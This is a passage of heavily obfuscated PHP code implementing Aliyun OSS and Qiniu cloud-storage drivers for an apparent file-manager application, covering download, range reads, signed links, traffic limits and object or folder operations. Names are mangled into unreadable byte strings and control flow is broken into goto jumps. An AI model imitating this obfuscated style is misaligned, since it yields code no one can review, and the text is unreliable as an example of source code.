d¾ãßèæÄ; d¾ãßèæÄ: $EÛáŞ¸…¢ç = $eª·ˆÌ¯ìõ->getListPart(); $BÑï¶ÇÃÌœ = array(); foreach ($EÛáŞ¸…¢ç as $c¹Ô¿Õ‡Ÿ×) { $BÑï¶ÇÃÌœ[] = array($díË£Œ¯ª[1288] => $c¹Ô¿Õ‡Ÿ×->getPartNumber(), $díË£Œ¯ª[1289] => trim($c¹Ô¿Õ‡Ÿ×->getETag(), $díË£Œ¯ª[116])); } goto FÑß‘¬õ•«; b®ëÅå¬šù: } public function download($a†‰Ïæ„µË, $bã…íò¦¨¸) { if ($this->isFolder($a†‰Ïæ„µË)) { return !1; } try { $e„®ñƒè›Š = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bã…íò¦¨¸); $e„®ñƒè›Š = $this->trafficLimit($_SERVER[úÉ·öƒÑì©][109], $e„®ñƒè›Š); $this->client->getObject($this->bucket, $this->pathEncode($a†‰Ïæ„µË), $e„®ñƒè›Š); } catch (OSS\Core\OssException $Cåù·×á½) { return !1; } return $bã…íò¦¨¸; } public function fileSubstr($D­ÔËŸŒŸ¬, $fÊºôØ£·Ú = 0, $E‰Ô”£Ş‡  = false) { if ($fÊºôØ£·Ú === -1) { $Bø“™¶ö¯ = array(); } else { if ($E‰Ô”£Ş‡  === !1) { $dÎ†âÕä¢ = $this->size($D­ÔËŸŒŸ¬); } else { $dÎ†âÕä¢ = $fÊºôØ£·Ú + $E‰Ô”£Ş‡  - 1; } $Bø“™¶ö¯ = array(OSS\OssClient::OSS_RANGE => "{$fÊºôØ£·Ú}\x2d{$dÎ†âÕä¢}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($D­ÔËŸŒŸ¬), $Bø“™¶ö¯); } catch (OSS\Core\OssException $fÛäªŒªÒ) { think_exception($fÛäªŒªÒ->getMessage()); return !1; } } private function trafficLimit($EÆ»†¥‰ÇÈ, $F£ÓÑìÂ˜£ = array()) { goto e¶‹ÑÁ«Á; eáÁ¯ˆàä: return $F£ÓÑìÂ˜£; goto eÆÓÀ‰‰Œ; E‹¬áš¥æÍ: if (!$D¹«¬Ø™´â) { return $F£ÓÑìÂ˜£; } $D¹«¬Ø™´â = $D¹«¬Ø™´â < 819200 ? 819200 : ($D¹«¬Ø™´â > 838860800 ? 838860800 : $D¹«¬Ø™´â); $F£ÓÑìÂ˜£[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($D¹«¬Ø™´â); goto eáÁ¯ˆàä; e¶‹ÑÁ«Á: $f¡ç¿³÷ =& $_SERVER[úÉ·öƒÑì©]; if ($EÆ»†¥‰ÇÈ == $f¡ç¿³÷[1295] && $this->isUploadServer() || $EÆ»†¥‰ÇÈ == $f¡ç¿³÷[109] && $this->isFileOutServer()) { return $F£ÓÑìÂ˜£; } $D¹«¬Ø™´â = floatval($GLOBALS[$f¡ç¿³÷[6]][$f¡ç¿³÷[88]][$f¡ç¿³÷[107]][$EÆ»†¥‰ÇÈ]) * 1024 * 1024 * 8; goto E‹¬áš¥æÍ; eÆÓÀ‰‰Œ: } public function link($eòÚîœÒ, $e‹ïäà‘’ù = array()) { $d¡ŞÍ‡†‡‘ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->exist($eòÚîœÒ) || $this->isFolder($eòÚîœÒ)) { return !1; } try { $e‹ïäà‘’ù = $this->trafficLimit($d¡ŞÍ‡†‡‘[109], $e‹ïäà‘’ù); $f¯™ƒŒÉÁ¡ = $this->client->signUrl($this->bucket, $this->pathEncode($eòÚîœÒ), 3600 * 12, $d¡ŞÍ‡†‡‘[228], $e‹ïäà‘’ù); return $this->getCdnLink($f¯™ƒŒÉÁ¡); } catch (OSS\Core\OssException $BİçÙ×•¢) { return !1; } } public function fileOut($døá‹Ú°‡, $aÍóÁîÕó = false, $CÛİ¥ø¸© = false, $aè£²é­åª = '') { goto eİãõ³Ù£˜; cÑØä¡Ÿ»æ: $CÛİ¥ø¸© = rawurlencode($CÛİ¥ø¸©); $FÚÁ‰öšø„ = get_file_mime(get_path_ext($CÛİ¥ø¸©)); if ($FÚÁ‰öšø„ == $Cãİƒ—Ï¯ù[213]) { return parent::fileOut($døá‹Ú°‡, $aÍóÁîÕó, $CÛİ¥ø¸©, $aè£²é­åª); } goto a»ÅÀ½ß³; eİãõ³Ù£˜: $Cãİƒ—Ï¯ù =& $_SERVER[úÉ·öƒÑì©]; if ($this->isFileOutServer()) { return $this->fileOutServer($døá‹Ú°‡, $aÍóÁîÕó, $CÛİ¥ø¸©, $aè£²é­åª); } if (!$CÛİ¥ø¸©) { $CÛİ¥ø¸© = $this->pathThis($døá‹Ú°‡); } goto cÑØä¡Ÿ»æ; D¨İá—: $eå¹Ï¢®ŞŒ = $this->link($døá‹Ú°‡, $E¶á÷Ğàø˜); $this->fileOutLink($eå¹Ï¢®ŞŒ); goto a±¬·‹¸îÍ; a»ÅÀ½ß³: $aÍóÁîÕó = $aÍóÁîÕó ? $Cãİƒ—Ï¯ù[214] : $Cãİƒ—Ï¯ù[215]; $E¶á÷Ğàø˜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Cãİƒ—Ï¯ù[1306] . rawurlencode("{$aÍóÁîÕó}\x3b\146\151\154\145\x6e\141\x6d\x65\x3d{$CÛİ¥ø¸©}")); $E¶á÷Ğàø˜[OSS\OssClient::OSS_SUB_RESOURCE] .= $Cãİƒ—Ï¯ù[1307] . rawurlencode($FÚÁ‰öšø„); goto D¨İá—; a±¬·‹¸îÍ: } public function fileOutServer($b©¡§ëÃ‘•, $dŠ×´Ğá”– = false, $E—·¤ÌØß² = false, $dåÙÅµ”ñÃ = '') { parent::fileOut($b©¡§ëÃ‘•, $dŠ×´Ğá”–, $E—·¤ÌØß², $dåÙÅµ”ñÃ); } public function fileOutImage($dã±Ó·Ï, $b¡–½°Á›Í = 250) { $CŒ‹Õ‡¨¥Œ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[úÉ·öƒÑì©][1308] . $b¡–½°Á›Í); $a„÷ç¾Ş’ = $this->link($dã±Ó·Ï, $CŒ‹Õ‡¨¥Œ); $this->fileOutLink($a„÷ç¾Ş’); } public function fileOutImageServer($B”õ³ºÏ¾ë, $D·µØƒ‘ôï = 250) { parent::fileOutImage($B”õ³ºÏ¾ë, $D·µØƒ‘ôï); } public function fileOutLink($Aïª‰èŞ) { $fÈ”©²Å¹ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->isCdnHost() && substr($Aïª‰èŞ, 0, 7) == $fÈ”©²Å¹[1211]) { $Aïª‰èŞ = $fÈ”©²Å¹[1212] . substr($Aïª‰èŞ, 7); } header($fÈ”©²Å¹[159] . $Aïª‰èŞ); die; } public function hashMd5($C äØ“Õâ, $D¥Û¢‹‹‡ = '') { $CÓ‚ÅºªÚë =& $_SERVER[úÉ·öƒÑì©]; $bµ—·á ÕË = $this->_objectMeta($C äØ“Õâ); if (!$bµ—·á ÕË) { return $CÓ‚ÅºªÚë[33]; } if (!isset($bµ—·á ÕË[$CÓ‚ÅºªÚë[1284]]) && !empty($D¥Û¢‹‹‡)) { $DÙöç­‰¼ = $this->updateObjMeta($C äØ“Õâ, array($CÓ‚ÅºªÚë[1284] => $D¥Û¢‹‹‡)); $bµ—·á ÕË[$CÓ‚ÅºªÚë[1284]] = $DÙöç­‰¼ ? $D¥Û¢‹‹‡ : $CÓ‚ÅºªÚë[33]; } return isset($bµ—·á ÕË[$CÓ‚ÅºªÚë[1284]]) ? strtolower($bµ—·á ÕË[$CÓ‚ÅºªÚë[1284]]) : $CÓ‚ÅºªÚë[33]; } public function size($dİ†¶îµï) { $B†îˆÚƒ = $this->objectMeta($dİ†¶îµï); return $B†îˆÚƒ ? $B†îˆÚƒ[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function info($f°ëèµ®) { if ($this->isFolder($f°ëèµ®)) { return $this->folderInfo($f°ëèµ®); } else { if ($this->isFile($f°ëèµ®)) { return $this->fileInfo($f°ëèµ®); } } return !1; } public function exist($cóÍ™Ş¡ìÙ) { return $this->isFile($cóÍ™Ş¡ìÙ) || $this->isFolder($cóÍ™Ş¡ìÙ); } public function isFile($aì°ƒ¸¼‘) { return !$this->isFolder($aì°ƒ¸¼‘) && $this->objectMeta($aì°ƒ¸¼‘); } public function isFolder($f¥åå¥»‡Å) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][199], $f¥åå¥»‡Å); } protected function objectMeta($D¦Á„Š‡ÑÕ) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][200], $D¦Á„Š‡ÑÕ); } protected function _objectMeta($Dç®§·ñÉ) { $a ‡ğÅí‹ì =& $_SERVER[úÉ·öƒÑì©]; try { $Cß¥êÂ—¬ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Dç®§·ñÉ)); } catch (OSS\Core\OssException $aÈÆ îê•) { $Cß¥êÂ—¬ = !1; } if ($Cß¥êÂ—¬) { $Cß¥êÂ—¬[$a ‡ğÅí‹ì[78]] = intval($Cß¥êÂ—¬[$a ‡ğÅí‹ì[1282]]); } return $Cß¥êÂ—¬; } protected function _isFolder($Dµ‚ø‰çÛ) { $dİ›˜†œÅ› =& $_SERVER[úÉ·öƒÑì©]; if ($Dµ‚ø‰çÛ == $dİ›˜†œÅ›[33] || $Dµ‚ø‰çÛ == $dİ›˜†œÅ›[8]) { return !0; } $fË¦Ê®ñ·å = array($dİ›˜†œÅ›[1278] => $dİ›˜†œÅ›[8], $dİ›˜†œÅ›[1279] => rtrim($Dµ‚ø‰çÛ, $dİ›˜†œÅ›[8]) . $dİ›˜†œÅ›[8], $dİ›˜†œÅ›[1280] => 1, $dİ›˜†œÅ›[1281] => $dİ›˜†œÅ›[33]); $eí¬©Ö¨õ‚ = $this->client->listObjects($this->bucket, $fË¦Ê®ñ·å); if ($eí¬©Ö¨õ‚->getObjectList() || $eí¬©Ö¨õ‚->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($A‘Ú˜¯Ûã) { parent::__construct(); require_once SDK_DIR . $_SERVER[úÉ·öƒÑì©][1309]; $this->_init($A‘Ú˜¯Ûã); } public function _init($eˆÛ§ó™Ù¸) { goto FÒ’¹äñ†Å; Fø¹İáñ†ê: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto BÔÇñõˆ¨; FÒ’¹äñ†Å: $d”Õ‹¿ìÓÈ =& $_SERVER[úÉ·öƒÑì©]; foreach ($eˆÛ§ó™Ù¸ as $C´œµ´æÊ => $FØ†µ‹¾À) { if (isset($this->{$C´œµ´æÊ})) { $this->{$C´œµ´æÊ} = $FØ†µ‹¾À; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($d”Õ‹¿ìÓÈ[1310] . LNG($d”Õ‹¿ìÓÈ[1269])); } goto d÷Î°¹Éäƒ; d÷Î°¹Éäƒ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto Fø¹İáñ†ê; BÔÇñõˆ¨: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($DÔ‰°§»ó‰, $eç¶‹Ê½Š‰ = '', $cÀÔ–öàêõ = REPEAT_RENAME) { if ($this->setContent($DÔ‰°§»ó‰, $eç¶‹Ê½Š‰)) { return $this->getPathOuter($DÔ‰°§»ó‰); } return !1; } public function mkdir($e¬àÜë¹, $A¸ê¨ƒÔåÓ = REPEAT_SKIP) { goto e‡éÙ¡²„â; e‡éÙ¡²„â: $b‹ãİé†¤ù =& $_SERVER[úÉ·öƒÑì©]; $A†¨ë¹´Ãé = trim($e¬àÜë¹, $b‹ãİé†¤ù[8]); if ($this->_isFolder($A†¨ë¹´Ãé)) { return $this->getPathOuter($A†¨ë¹´Ãé); } goto dß‘–µîéİ; fàİ¬¬è¡„: if (!$this->mkfile($eŠù…†³Èã)) { return !1; } if (!$this->moveFile($eŠù…†³Èã, $e¬àÜë¹)) { $this->delFile($eŠù…†³Èã); return !1; } return $this->getPathOuter($A†¨ë¹´Ãé); goto eŠ±äôÖ¾î; dß‘–µîéİ: $e¬àÜë¹ = $A†¨ë¹´Ãé . $b‹ãİé†¤ù[8]; $DÚÛ„­Œ² = get_path_this($A†¨ë¹´Ãé); $eŠù…†³Èã = $e¬àÜë¹ . $DÚÛ„­Œ²; goto fàİ¬¬è¡„; eŠ±äôÖ¾î: } public function copyFile($Dª¼šì¾¿, $aùªßİõŸâ) { $bâ•ß’Ä³ = $this->bucketManager->copy($this->bucket, $Dª¼šì¾¿, $this->bucket, $aùªßİõŸâ, !0); return $bâ•ß’Ä³ ? !1 : $this->getPathOuter($aùªßİõŸâ); } public function moveFile($Cê¤‡èÖñ…, $eˆ¸Ş‡í) { $Fää“‘¥ŞÈ = $this->bucketManager->move($this->bucket, $Cê¤‡èÖñ…, $this->bucket, $eˆ¸Ş‡í, !0); return $Fää“‘¥ŞÈ ? !1 : $this->getPathOuter($eˆ¸Ş‡í); } public function delFile($c¥Î³×é‰Â) { if (!$this->exist($c¥Î³×é‰Â)) { return !0; } $EâÚ­ó•±Ë = $this->bucketManager->delete($this->bucket, $c¥Î³×é‰Â); return $EâÚ­ó•±Ë ? !1 : !0; } public function delFolder($EèÄ¡ìñ©í) { goto a’ãó„Ù°; a’ãó„Ù°: $aÇßØ»®ĞË =& $_SERVER[úÉ·öƒÑì©]; if (!$this->exist($EèÄ¡ìñ©í)) { return !0; } $this->listItemCache = !1; goto f¯¯¸Ó”ˆ‘; f¯¯¸Ó”ˆ‘: $aÂ“ó§Ù¬Í = $this->fileList($EèÄ¡ìñ©í); $this->listItemCache = !0; $bÚ÷ñè°À‡ = trim($EèÄ¡ìñ©í, $aÇßØ»®ĞË[8]) . $aÇßØ»®ĞË[8]; goto b¹­î°ˆ; b©Ñ÷Å¶âÀ: $aõË×ø„§Õ = $this->delByBatch($aÂ“ó§Ù¬Í[$aÇßØ»®ĞË[75]]); if (!$aõË×ø„§Õ) { return !1; } return $this->delFile($bÚ÷ñè°À‡); goto DÔÜ¾³¹»†; b¹­î°ˆ: if (!empty($EèÄ¡ìñ©í) && $EèÄ¡ìñ©í !== $aÇßØ»®ĞË[191] && !in_array($bÚ÷ñè°À‡, $aÂ“ó§Ù¬Í[$aÇßØ»®ĞË[75]])) { $aÂ“ó§Ù¬Í[$aÇßØ»®ĞË[75]][] = $bÚ÷ñè°À‡; } $aõË×ø„§Õ = $this->delByBatch($aÂ“ó§Ù¬Í[$aÇßØ»®ĞË[74]]); if (!$aõË×ø„§Õ) { return !1; } goto b©Ñ÷Å¶âÀ; DÔÜ¾³¹»†: } private function delByBatch($bï¨¦ëíµâ) { foreach (array_chunk($bï¨¦ëíµâ, 1000) as $d‚ñİéÅ—è) { $cÅ‹÷é— Û = $this->bucketManager->buildBatchDelete($this->bucket, $d‚ñİéÅ—è); list($Cçˆ­œ³«‹, $DÊìÊïŸöĞ) = $this->bucketManager->batch($cÅ‹÷é— Û); if ($DÊìÊïŸöĞ) { return !1; } } return !0; } public function rename($BÁ§÷â°‚å, $Bœ˜¢®ëÅÕ) { return $this->renameObject($BÁ§÷â°‚å, $Bœ˜¢®ëÅÕ); } public function fileInfo($fÔ®°¯ëŒ•, $AÕš¿±ƒô = false, $dÔÆ—¤ŞÑË = array()) { goto Fˆò„ÚŠŠ; BÂ¯Ÿòš²Ó: if (isset($dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1312]])) { $f©‡††Ó’Ô[$D¶Ìíƒ“àë[84]] = substr($dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1312]] . $D¶Ìíƒ“àë[33], 0, 10); } if (isset($dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1311]])) { $f©‡††Ó’Ô[$D¶Ìíƒ“àë[78]] = $dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1311]]; } return $f©‡††Ó’Ô; goto fÌ‚¼¢À‰È; Fˆò„ÚŠŠ: $D¶Ìíƒ“àë =& $_SERVER[úÉ·öƒÑì©]; $f©‡††Ó’Ô = array($D¶Ìíƒ“àë[28] => $this->pathThis($fÔ®°¯ëŒ•), $D¶Ìíƒ“àë[76] => $this->getPathOuter($D¶Ìíƒ“àë[8] . $fÔ®°¯ëŒ•), $D¶Ìíƒ“àë[29] => $D¶Ìíƒ“àë[193], $D¶Ìíƒ“àë[78] => isset($dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1311]]) ? $dÔÆ—¤ŞÑË[$D¶Ìíƒ“àë[1311]] : 0, $D¶Ìíƒ“àë[168] => $this->ext($fÔ®°¯ëŒ•)); if ($AÕš¿±ƒô) { return $f©‡††Ó’Ô; } goto DŸäÕå®—; DŸäÕå®—: $f©‡††Ó’Ô[$D¶Ìíƒ“àë[194]] = $f©‡††Ó’Ô[$D¶Ìíƒ“àë[84]] = 0; $f©‡††Ó’Ô[$D¶Ìíƒ“àë[195]] = $f©‡††Ó’Ô[$D¶Ìíƒ“àë[196]] = !0; if (empty($dÔÆ—¤ŞÑË)) { $dÔÆ—¤ŞÑË = $this->objectMeta($fÔ®°¯ëŒ•); if (!$dÔÆ—¤ŞÑË) { return $f©‡††Ó’Ô; } } goto BÂ¯Ÿòš²Ó; fÌ‚¼¢À‰È: } public function folderInfo($AÜ‰ˆ¬ÊÏÕ, $D²õ¶Ê‚¬ = false) { goto fâÖäßƒ; fâÖäßƒ: $aµÛÎ¿Áİ˜ =& $_SERVER[úÉ·öƒÑì©]; $c›ßÔÎ‰Æ± = array($aµÛÎ¿Áİ˜[28] => $this->pathThis($AÜ‰ˆ¬ÊÏÕ), $aµÛÎ¿Áİ˜[76] => $this->getPathOuter($aµÛÎ¿Áİ˜[8] . $AÜ‰ˆ¬ÊÏÕ), $aµÛÎ¿Áİ˜[29] => $aµÛÎ¿Áİ˜[77]); if ($D²õ¶Ê‚¬) { return $c›ßÔÎ‰Æ±; } goto BÄ˜ìŒÏ¦’; CÚ±´¬î»: $b†µ”ò‹Ñ = $this->objectMeta($AÜ‰ˆ¬ÊÏÕ); if (isset($b†µ”ò‹Ñ[$aµÛÎ¿Áİ˜[1312]])) { $c›ßÔÎ‰Æ±[$aµÛÎ¿Áİ˜[84]] = substr($b†µ”ò‹Ñ[$aµÛÎ¿Áİ˜[1312]] . $aµÛÎ¿Áİ˜[33], 0, 10); } return $c›ßÔÎ‰Æ±; goto eÖ½øÍ…Îì; BÄ˜ìŒÏ¦’: $c›ßÔÎ‰Æ±[$aµÛÎ¿Áİ˜[194]] = $c›ßÔÎ‰Æ±[$aµÛÎ¿Áİ˜[84]] = 0; $c›ßÔÎ‰Æ±[$aµÛÎ¿Áİ˜[195]] = $c›ßÔÎ‰Æ±[$aµÛÎ¿Áİ˜[196]] = !0; $AÜ‰ˆ¬ÊÏÕ = rtrim($AÜ‰ˆ¬ÊÏÕ, $aµÛÎ¿Áİ˜[8]) . $aµÛÎ¿Áİ˜[8]; goto CÚ±´¬î»; eÖ½øÍ…Îì: } public function listPath($CìáÙóŸ’Ÿ, $d÷ ¦œª£ = false) { $E¾šó¼·ÄÕ =& $_SERVER[úÉ·öƒÑì©]; $bñ¶”øÏˆ„ = $this->fileList($CìáÙóŸ’Ÿ, $E¾šó¼·ÄÕ[8], !0); foreach ($bñ¶”øÏˆ„[$E¾šó¼·ÄÕ[75]] as $aš¹ÚÈœ => $cÒà»„Æ…í) { $bñ¶”øÏˆ„[$E¾šó¼·ÄÕ[75]][$aš¹ÚÈœ] = $this->folderInfo($cÒà»„Æ…í, $d÷ ¦œª£); } foreach ($bñ¶”øÏˆ„[$E¾šó¼·ÄÕ[74]] as $aš¹ÚÈœ => $cÒà»„Æ…í) { $bñ¶”øÏˆ„[$E¾šó¼·ÄÕ[74]][$aš¹ÚÈœ] = $this->fileInfo($cÒà»„Æ…í[$E¾šó¼·ÄÕ[93]], $d÷ ¦œª£, $cÒà»„Æ…í); } return $bñ¶”øÏˆ„; } public function has($b‹·‘ÀĞëÍ, $CòÍ¨†¾¹ = false, $bÏİ¢º”Ã = true) { goto Eˆ‘Œ´¥®; AÇ…¸š¤Ú: $BˆóÉ•Ëî® = $e›‹Á½Ç…« = 0; while (!0) { check_abort(); list($aªİÏò±’È, $fÚ½„—ç–÷) = $this->bucketManager->listFiles($this->bucket, $Fè…†Ë„ã§, $A›Š²­‚ó˜, $FÀÛ‘¯‹É¸, $a£‰ÕÕÜ†); if ($fÚ½„—ç–÷) { break; } $A›Š²­‚ó˜ = array_key_exists($a›Ã‘é–†¾[1281], $aªİÏò±’È) ? $A›Š²­‚ó˜ = $aªİÏò±’È[$a›Ã‘é–†¾[1313]] : $a›Ã‘é–†¾[33]; if ($CòÍ¨†¾¹) { if (!empty($aªİÏò±’È[$a›Ã‘é–†¾[1314]])) { $BˆóÉ•Ëî® += count($aªİÏò±’È[$a›Ã‘é–†¾[1314]]); } if (!empty($aªİÏò±’È[$a›Ã‘é–†¾[1315]])) { $e›‹Á½Ç…« += count($aªİÏò±’È[$a›Ã‘é–†¾[1315]]); } if ($A›Š²­‚ó˜ === $a›Ã‘é–†¾[33]) { break; } continue; } if ($bÏİ¢º”Ã) { if (!empty($aªİÏò±’È[$a›Ã‘é–†¾[1314]])) { return !0; } } else { if (!empty($aªİÏò±’È[$a›Ã‘é–†¾[1315]])) { return !0; } } if ($A›Š²­‚ó˜ === $a›Ã‘é–†¾[33]) { break; } } if ($CòÍ¨†¾¹) { return array($a›Ã‘é–†¾[203] => $BˆóÉ•Ëî®, $a›Ã‘é–†¾[204] => $e›‹Á½Ç…«); } goto CƒÍîÕåÓ§; CƒÍîÕåÓ§: return !1; goto e­¿¥ºÈŒó; Eˆ‘Œ´¥®: $a›Ã‘é–†¾ =& $_SERVER[úÉ·öƒÑì©]; $b‹·‘ÀĞëÍ = trim($b‹·‘ÀĞëÍ, $a›Ã‘é–†¾[8]); $Fè…†Ë„ã§ = empty($b‹·‘ÀĞëÍ) && $b‹·‘ÀĞëÍ !== $a›Ã‘é–†¾[191] ? $a›Ã‘é–†¾[33] : $b‹·‘ÀĞëÍ . $a›Ã‘é–†¾[8]; goto E…Šµñ²ñ²; E…Šµñ²ñ²: $A›Š²­‚ó˜ = $a›Ã‘é–†¾[33]; $FÀÛ‘¯‹É¸ = 500; $a£‰ÕÕÜ† = $a›Ã‘é–†¾[8]; goto AÇ…¸š¤Ú; e­¿¥ºÈŒó: } public function listAll($Eæøï…´ë¶) { $dÎÀá˜Û± =& $_SERVER[úÉ·öƒÑì©]; $c¥‹­¦í¾„ = $this->fileList($Eæøï…´ë¶, $dÎÀá˜Û±[33], !0); $eÑĞ¡àÎ´× = array(); foreach ($c¥‹­¦í¾„[$dÎÀá˜Û±[74]] as $E±ƒÈ…Ê†Å) { $eÑĞ¡àÎ´×[$E±ƒÈ…Ê†Å[$dÎÀá˜Û±[93]]] = $E±ƒÈ…Ê†Å[$dÎÀá˜Û±[78]]; } foreach ($c¥‹­¦í¾„[$dÎÀá˜Û±[75]] as $E±ƒÈ…Ê†Å) { if (is_string($E±ƒÈ…Ê†Å)) { $eÑĞ¡àÎ´×[$E±ƒÈ…Ê†Å] = 0; } } return $this->listAllFiles($Eæøï…´ë¶, array_keys($eÑĞ¡àÎ´×), $eÑĞ¡àÎ´×); } private function fileList($Aò²ÁÇƒÊÁ, $DùÆìŠÅÙ = '', $e–â÷Ä—² = 0) { goto D˜¶ÌÑ÷; aÚæåÓÆ„Ÿ: return array($B†…Å¢¬Èˆ[75] => $Då·×Ú¡ò, $B†…Å¢¬Èˆ[74] => $B©çÍÜŠÃÎ); goto CØÁŠÊ‘·§; c­£÷ÙéĞ: $fĞ¾‘¤ËÙí = $B†…Å¢¬Èˆ[33]; $Aõ÷¤¿Å± = 1000; $B®ó…•—«‰ = $this->listItemCache === !1 ? !1 : !0; goto DŒ·‹‘‹¢®; DŒ·‹‘‹¢®: $Då·×Ú¡ò = $B©çÍÜŠÃÎ = array(); while (!0) { check_abort(); list($a©ìÒçµĞœ, $fíĞéÁåĞ) = $this->bucketManager->listFiles($this->bucket, $CÃÎÓÈÓÒ”, $fĞ¾‘¤ËÙí, $Aõ÷¤¿Å±, $DùÆìŠÅÙ); if ($fíĞéÁåĞ) { break; } $fĞ¾‘¤ËÙí = array_key_exists($B†…Å¢¬Èˆ[1281], $a©ìÒçµĞœ) ? $fĞ¾‘¤ËÙí = $a©ìÒçµĞœ[$B†…Å¢¬Èˆ[1313]] : $B†…Å¢¬Èˆ[33]; $FÂ©‰“õ„² = isset($a©ìÒçµĞœ[$B†…Å¢¬Èˆ[1314]]) ? $a©ìÒçµĞœ[$B†…Å¢¬Èˆ[1314]] : array(); $A³ˆ•‹Şê = isset($a©ìÒçµĞœ[$B†…Å¢¬Èˆ[1315]]) ? $a©ìÒçµĞœ[$B†…Å¢¬Èˆ[1315]] : array(); foreach ($FÂ©‰“õ„² as $D©ò½»¸­») { goto f£•ÒÖñ‹–; cÅè‚–: if ($c™ÅÄ›åŠ¤) { $Då·×Ú¡ò[] = $dÚ¾áŸšÍÄ; continue; } $B©çÍÜŠÃÎ[] = $e–â÷Ä—² ? $D©ò½»¸­» : $dÚ¾áŸšÍÄ; goto eâ³Á‚‚³ø; eâßÚ–ÌÍ: $D©ò½»¸­»[$B†…Å¢¬Èˆ[78]] = $aö¦£ŸÜ”°; $c™ÅÄ›åŠ¤ = $aö¦£ŸÜ”° == 0 && substr($dÚ¾áŸšÍÄ, strlen($dÚ¾áŸšÍÄ) - 1, 1) == $B†…Å¢¬Èˆ[8] ? !0 : !1; if ($B®ó…•—«‰) { $this->cacheMethod($B†…Å¢¬Èˆ[199], $dÚ¾áŸšÍÄ, $c™ÅÄ›åŠ¤); $this->cacheMethod($B†…Å¢¬Èˆ[200], $dÚ¾áŸšÍÄ, $D©ò½»¸­»); } goto cÅè‚–; f£•ÒÖñ‹–: if ($D©ò½»¸­»[$B†…Å¢¬Èˆ[93]] == $CÃÎÓÈÓÒ”) { continue; } $dÚ¾áŸšÍÄ = $D©ò½»¸­»[$B†…Å¢¬Èˆ[93]]; $aö¦£ŸÜ”° = $D©ò½»¸­»[$B†…Å¢¬Èˆ[1311]]; goto eâßÚ–ÌÍ; eâ³Á‚‚³ø: } foreach ($A³ˆ•‹Şê as $dÚ¾áŸšÍÄ) { if ($dÚ¾áŸšÍÄ == $CÃÎÓÈÓÒ”) { continue; } $Då·×Ú¡ò[] = $dÚ¾áŸšÍÄ; if ($B®ó…•—«‰) { $this->cacheMethod($B†…Å¢¬Èˆ[199], $dÚ¾áŸšÍÄ, !0); } } if ($fĞ¾‘¤ËÙí === $B†…Å¢¬Èˆ[33]) { break; } } if ($B®ó…•—«‰) { $this->cacheMethod($B†…Å¢¬Èˆ[199], $Aò²ÁÇƒÊÁ, !0); } goto aÚæåÓÆ„Ÿ; D˜¶ÌÑ÷: $B†…Å¢¬Èˆ =& $_SERVER[úÉ·öƒÑì©]; $Aò²ÁÇƒÊÁ = trim($Aò²ÁÇƒÊÁ, $B†…Å¢¬Èˆ[8]); $CÃÎÓÈÓÒ” = empty($Aò²ÁÇƒÊÁ) && $Aò²ÁÇƒÊÁ !== $B†…Å¢¬Èˆ[191] ? $B†…Å¢¬Èˆ[33] : $Aò²ÁÇƒÊÁ . $B†…Å¢¬Èˆ[8]; goto c­£÷ÙéĞ; CØÁŠÊ‘·§: } public function canRead($fÏŒ°ìÀË£) { return $this->exist($fÏŒ°ìÀË£) ? !0 : !1; } public function canWrite($e·çÃ†±÷) { return $this->exist($e·çÃ†±÷) ? !0 : !1; } public function getContent($e©Š«”Ç¤) { return $this->fileSubstr($e©Š«”Ç¤, 0, -1); } public function setContent($F§ˆ¦²åâ´, $Fƒàµîˆ‚İ = '') { $FàÆ¡¶äØ = $this->tempFile($this->pathThis($F§ˆ¦²åâ´)); file_put_contents($FàÆ¡¶äØ, $Fƒàµîˆ‚İ); if ($this->upload($F§ˆ¦²åâ´, $FàÆ¡¶äØ)) { $this->tempFileRemve($FàÆ¡¶äØ); return !0; } return !1; } public function refreshUrls($D¬Ô¦¥“Î) { goto E¤Šå×Î”; C„Á»É£¦: $dÏùëë˜¶‰ = new Qiniu\Cdn\CdnManager($this->auth); list($Fóùª­å¿Ï, $eîªÀé¢Ë) = $dÏùëë˜¶‰->refreshUrls($bãÖ´ÂÌ¢¶); if ($eîªÀé¢Ë) { return !1; } goto D÷­¾¨ õ°; E¤Šå×Î”: $fªÀë†ô»² =& $_SERVER[úÉ·öƒÑì©]; $bãÖ´ÂÌ¢¶ = array(); if (is_array($D¬Ô¦¥“Î)) { foreach ($D¬Ô¦¥“Î as $fÃ˜ó÷ÈÓ) { $bãÖ´ÂÌ¢¶[] = $this->link($fÃ˜ó÷ÈÓ); } } else { $bãÖ´ÂÌ¢¶[] = $this->link($D¬Ô¦¥“Î); } goto C„Á»É£¦; D÷­¾¨ õ°: return $Fóùª­å¿Ï[$fªÀë†ô»²[1086]] == $fªÀë†ô»²[736] ? !0 : !1; goto BÕŞÍŸÈ±œ; BÕŞÍŸÈ±œ: } public function fileSubstr($C«ç³×éç, $c°ƒÌË‘…×, $fšÔÁò©è») { $EË³â¥Ô =& $_SERVER[úÉ·öƒÑì©]; if (!($Cœ¯È…É = $this->link($C«ç³×éç))) { return !1; } $DÃÈä†±§Ï = !1; if ($fšÔÁò©è» > 0) { $DñÂ«İá = $c°ƒÌË‘…× + 